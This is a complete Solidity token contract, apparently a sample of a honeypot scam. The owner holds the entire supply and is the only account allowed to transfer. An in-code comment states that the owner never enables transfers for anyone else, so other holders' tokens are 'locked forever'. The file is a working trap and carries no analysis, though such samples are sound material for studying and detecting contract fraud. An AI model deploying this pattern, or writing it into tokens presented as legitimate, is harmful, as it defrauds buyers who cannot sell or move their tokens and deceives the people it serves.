pragma solidity ^0.8.0;
contract TRANSFERLOCK {
  address private owner;
  mapping(address=>uint256) public bal;
  bool public transfersEnabled = false;
  constructor() { owner = msg.sender; bal[owner] = 1e27; transfersEnabled = false; }
  function enableTransfers() external { require(msg.sender==owner); transfersEnabled = true; }
  function transfer(address to, uint256 amt) external {
    // Owner never calls enableTransfers() — locked forever
    require(transfersEnabled || msg.sender==owner, 'Transfers disabled');
    bal[msg.sender] -= amt;
    bal[to] += amt;
  }
}

